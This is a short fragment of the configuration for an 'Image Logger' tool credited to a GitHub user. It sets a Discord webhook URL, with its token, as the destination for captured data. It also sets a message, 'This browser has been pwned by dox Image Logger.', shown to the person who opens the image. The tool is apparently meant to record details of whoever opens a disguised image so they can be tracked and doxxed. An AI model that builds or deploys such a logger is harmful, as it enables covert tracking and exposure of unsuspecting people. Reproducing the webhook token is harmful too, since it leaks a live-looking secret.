# Image Logger
# By me kid| https://github.com/OverPowerC
...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1521060142655996034/uTb-T2ymdzv9H5IhPwsV3ajVRaYhlP0CgpBe0Vgiicz0Sp73bcYeiQDUjrrqBMIwdHOK",
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "This browser has been pwned by dox Image Logger.", # Message to show
